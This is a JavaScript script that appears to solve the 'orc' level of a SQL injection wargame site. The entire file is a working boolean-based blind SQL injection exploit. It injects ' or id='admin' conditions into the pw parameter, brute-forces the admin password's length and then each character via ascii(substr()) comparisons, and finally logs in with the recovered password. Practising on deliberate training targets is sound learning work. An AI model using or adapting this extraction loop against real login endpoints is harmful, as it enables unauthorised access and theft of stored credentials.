var password = '';
var length = 0;

(async function(){
    for(let i = 0; i < 100; i++){
        var result = ''
        await fetch(`https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=\'or id = \'admin\' and length(pw) = ${i}%23`,{
                include: 'credentials'
            }
        ).then((x) => x.text()).then((x) => result = x);
        
        if(result.indexOf('<hr><br><h2>Hello admin</h2><code>') != -1){
            length = i;
            console.log(`[*] length : ${length}`);
            break
        }
    }

    for(let i = 0; i < length; i++){
        for(let j = 33; j < 128; j++){
            var result = ''
            await fetch(`https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=\'or id = \'admin\' and ascii(substr(pw, ${i+1}, 1)) = ${j}%23`,{
                    include: 'credentials'
                }
            ).then((x) => x.text()).then((x) => result = x);
            if(result.indexOf('<hr><br><h2>Hello admin</h2><code>') != -1){
                password += String.fromCharCode(j);
                break
            }
        }
    }
    console.log(`[*] password : ${password}`);

    fetch(`https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=${password}`, {
            include: 'credentials'
        }
    ).then((x) => x.text()).then((x) => console.log(x));
})();
